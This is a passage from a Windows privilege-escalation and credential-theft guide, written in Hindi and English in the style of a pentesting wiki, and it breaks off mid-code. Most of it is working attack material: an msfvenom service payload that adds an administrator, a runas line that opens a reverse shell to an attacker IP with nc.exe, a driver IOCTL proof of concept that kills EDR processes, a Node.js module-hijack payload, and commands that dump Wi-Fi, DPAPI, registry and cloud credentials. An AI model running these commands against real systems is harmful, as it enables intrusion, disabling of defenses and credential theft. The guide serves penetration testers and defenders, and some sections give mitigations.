```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability को detect और exploit** `metasploit` के साथ कर सकते हैं: `exploit/windows/local/trusted\_service\_path` आप manually `metasploit` के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service fail हो जाए तो कौन-सी actions ली जाएँ। इस feature को किसी binary की ओर point करने के लिए configure किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकती है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Applications

### Installed Applications

**binaries** की permissions जांचें (शायद आप किसी एक को overwrite करके privileges escalate कर सकें) और **folders** की भी ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लेखन अनुमतियाँ

जांचें कि क्या आप किसी config file को modify करके कोई special file read कर सकते हैं या किसी binary को modify कर सकते हैं जिसे Administrator account द्वारा execute किया जाने वाला है (schedtasks).

system में weak folder/files permissions find करने का एक तरीका यह है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders के अंदर किसी भी plugin DLL को autoload करता है। अगर कोई writable portable/copy install मौजूद है, तो malicious plugin drop करने से हर launch पर `notepad++.exe` के अंदर automatic code execution मिलती है (जिसमें `DllMain` और plugin callbacks से भी शामिल है)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Possible **third party weird/vulnerable** drivers देखें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver एक arbitrary kernel read/write primitive expose करता है (poorly designed IOCTL handlers में common), तो आप kernel memory से सीधे एक SYSTEM token चुराकर escalate कर सकते हैं। step‑by‑step technique यहां देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Race-condition bugs के लिए जहां vulnerable call attacker-controlled Object Manager path खोलता है, lookup को deliberately slow करना (max-length components या deep directory chains का उपयोग करके) window को microseconds से tens of microseconds तक बढ़ा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities deterministic layouts groom करने, writable HKLM/HKU descendants abuse करने, और metadata corruption को custom driver के बिना kernel paged-pool overflows में convert करने देती हैं। पूरा chain यहां सीखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object strong SDDL के साथ IoCreateDeviceSecure से create करते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN set करना भूल जाते हैं। इस flag के बिना, जब device को extra component वाले path के through open किया जाता है, secure DACL enforce नहीं होती, जिससे कोई भी unprivileged user namespace path जैसे का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device open कर ले, तो driver द्वारा exposed privileged IOCTLs का abuse LPE और tampering के लिए किया जा सकता है। wild में observed उदाहरण capabilities:
- arbitrary processes के लिए full-access handles return करना (token theft / DuplicateTokenEx/CreateProcessAsUser के जरिए SYSTEM shell)।
- unrestricted raw disk read/write (offline tampering, boot-time persistence tricks)।
- arbitrary processes terminate करना, including Protected Process/Light (PP/PPL), जिससे user land से kernel के through AV/EDR kill संभव होता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए Mitigations
- जब DACL द्वारा restricted किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- Privileged operations के लिए caller context validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को constrain करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Defenders के लिए Detection ideas
- suspicious device names (e.g., \\ .\\amsdk*) के user-mode opens और abuse का संकेत देने वाले specific IOCTL sequences monitor करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) enforce करें और अपनी own allow/deny lists maintain करें।


## PATH DLL Hijacking

अगर आपके पास PATH में मौजूद किसी folder के अंदर **write permissions** हैं, तो आप किसी process द्वारा loaded DLL को hijack कर सकते हैं और **privileges escalate** कर सकते हैं।

PATH के अंदर सभी folders की permissions check करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
अधिक जानकारी के लिए कि इस check का दुरुपयोग कैसे करें:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

यह **Windows uncontrolled search path** variant है जो **Node.js** और **Electron** applications को प्रभावित करता है जब वे `require("foo")` जैसा bare import करते हैं और expected module **missing** हो।

Node packages को directory tree में ऊपर की ओर चलते हुए और हर parent पर `node_modules` folders check करके resolve करता है। Windows पर, यह walk drive root तक पहुंच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch की गई application अंततः यह probe कर सकती है:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) रख सकता है और किसी **higher-privileged Node/Electron process** के missing dependency को resolve करने का wait कर सकता है। payload victim process के security context में execute होता है, इसलिए यह **LPE** बन जाता है जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app से चलता है।

यह खास तौर पर common है जब:

- कोई dependency `optionalDependencies` में declared हो
- कोई third-party library `require("foo")` को `try/catch` में wrap करे और failure पर continue करे
- production builds से कोई package removed हो, packaging के दौरान omitted हो, या install करने में fail हो
- vulnerable `require()` main application code के बजाय dependency tree के deep अंदर मौजूद हो

### Vulnerable targets की hunting

resolution path साबित करने के लिए **Procmon** का उपयोग करें:

- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` `contains` `node_modules` पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के नीचे अंतिम successful open पर focus करें

Unpacked `.asar` files या application sources में useful code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon या source review से **missing package name** की पहचान करें।
2. अगर root lookup directory पहले से मौजूद नहीं है, तो उसे create करें:
```powershell
mkdir C:\node_modules
```
3. exact expected name वाला एक module drop करें:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. पीड़ित application को trigger करें। यदि application `require("foo")` करने का प्रयास करती है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस pattern में fit होने वाले missing optional modules के real-world examples में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** reusable हिस्सा है: कोई भी **missing bare import** खोजें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening ideas

- जब कोई user `C:\node_modules` बनाता है या वहाँ नई `.js` files/packages लिखता है, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाले high-integrity processes को hunt करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` usage audit करें।
- Third-party code में silent `try { require("...") } catch {}` patterns review करें।
- जब library support करे, optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments legacy `utf-8-validate` probe से `WS_NO_UTF_8_VALIDATE=1` के साथ बच सकते हैं)।

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य known computers की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहर से **restricted services** की जांच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP टेबल
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित commands के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(rules list करें, rules create करें, turn off करें, turn off...)**

और[ network enumeration के लिए यहाँ commands](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का उपयोग करते हैं, तो यह GUI के माध्यम से पूछेगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root के रूप में bash आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में explore कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन user credentials को store करता है जो servers, websites और other programs के लिए हैं जिन्हें **Windows** users को automaticall**y** log in कर सकता है। पहली नज़र में, ऐसा लग सकता है कि अब users अपने Facebook credentials, Twitter credentials, Gmail credentials आदि store कर सकते हैं, ताकि वे browsers के जरिए automatically log in हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन credentials को store करता है जिनसे Windows users को automatically log in कर सकता है, जिसका मतलब है कि कोई भी **Windows application जिसे किसी resource (server या website) तक access करने के लिए credentials की जरूरत होती है** वह इस **Credential Manager** & Windows Vault का उपयोग कर सकती है और users के बार-बार username और password enter करने के बजाय supplied credentials इस्तेमाल कर सकती है।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials का उपयोग कर सकती हैं। इसलिए, अगर आपकी application vault का उपयोग करना चाहती है, तो उसे somehow **credential manager से communicate करना चाहिए और default storage vault से उस resource के credentials request करने चाहिए**।

मशीन पर stored credentials सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential set के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** डेटा की symmetric encryption के लिए एक method प्रदान करता है, जिसका उपयोग मुख्य रूप से Windows operating system में asymmetric private keys की symmetric encryption के लिए किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग करती है।

**DPAPI, user के login secrets से derived एक symmetric key के माध्यम से keys की encryption सक्षम करता है**। system encryption से जुड़े scenarios में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys, `%APPDATA%\Microsoft\Protect\{SID}` directory में stored होती हैं, जहाँ `{SID}` user का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो master key के साथ co-located होती है और उसी file में user की private keys को safeguard करती है**, सामान्यतः 64 bytes of random data से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस directory तक access restricted है, इसलिए CMD में `dir` command से इसकी contents list नहीं की जा सकती, हालांकि इसे PowerShell के माध्यम से list किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz module** `dpapi::masterkey` का उपयोग उपयुक्त arguments (`/pvk` or `/rpc`) के साथ इसे decrypt करने के लिए कर सकते हैं।

**master password** द्वारा protected **credentials files** आमतौर पर यहाँ स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक तरीके से store करने के लिए किया जाता है। Credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका आमतौर पर मतलब है कि उन्हें केवल वही user उसी computer पर decrypt कर सकता है जिस पर वे बनाए गए थे।

किसी file में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### Recently Run Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **पासवर्ड** और अन्य जानकारी **save** करने के लिए करते हैं, यह महसूस किए बिना कि यह एक database file है। यह file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में located है और इसे हमेशा search और examine करना worth होता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में located है।\
यदि यह file मौजूद है, तो संभव है कि कुछ **credentials** configured हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं .\
Installers **SYSTEM privileges** के साथ **run** होते हैं, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** के लिए vulnerable हैं
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty क्रेड्स
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर किया जा सकता है, इसलिए आपको check करना चाहिए कि उसमें कुछ interesting है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
अगर आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

अगर `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर automatically start हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब valid नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` के साथ add करने और ssh के माध्यम से एक machine में login करने की कोशिश की। registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के use की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Pasword

पहले एक सुविधा उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts की deployment की अनुमति देती थी। हालांकि, इस method में गंभीर security flaws थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML files के रूप में stored होते थे, किसी भी domain user द्वारा access किए जा सकते थे। दूसरा, इन GPPs के अंदर passwords, जो publicly documented default key का उपयोग करके AES256 से encrypted थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे एक serious risk पैदा होता था, क्योंकि इससे users को elevated privileges मिल सकते थे।

इस risk को कम करने के लिए, एक function बनाया गया था जो locally cached GPP files को scan करता है जिनमें एक non-empty "cpassword" field होती है। ऐसी file मिलने पर, function password को decrypt करता है और एक custom PowerShell object return करता है। इस object में GPP और file के location की details शामिल होती हैं, जिससे इस security vulnerability की पहचान और remediation में मदद मिलती है।

इन files के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में search करें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

